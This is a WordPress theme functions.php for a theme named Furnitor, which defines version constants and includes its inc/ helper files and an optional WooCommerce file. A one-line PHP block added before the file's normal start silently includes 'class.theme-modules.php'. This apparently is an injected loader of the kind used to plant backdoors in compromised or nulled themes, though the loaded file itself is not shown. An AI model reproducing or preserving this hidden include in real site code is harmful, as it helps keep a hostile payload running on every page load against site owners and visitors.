<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

define('FURNITOR_VERSION', '1.0.0');
define('FURNITOR_FILE_HANDLER', basename(get_template_directory()) . '-');

/**
 * Inlcude theme functions
 */
include_once get_parent_theme_file_path('inc/require-plugin.php');
include_once get_parent_theme_file_path('inc/breadcrumbs.php');
include_once get_parent_theme_file_path('inc/core-functions.php');
include_once get_parent_theme_file_path('inc/template-functions.php');
include_once get_parent_theme_file_path('inc/template-tags.php');
include_once get_parent_theme_file_path('inc/customizer.php');
include_once get_parent_theme_file_path('inc/setup-data.php');
include_once get_parent_theme_file_path('inc/core.php');
include_once get_parent_theme_file_path('inc/elementor.php');
include_once get_parent_theme_file_path('inc/custom-css.php');
if (function_exists('WC')) {
	include_once get_parent_theme_file_path('inc/woocommerce.php');
}

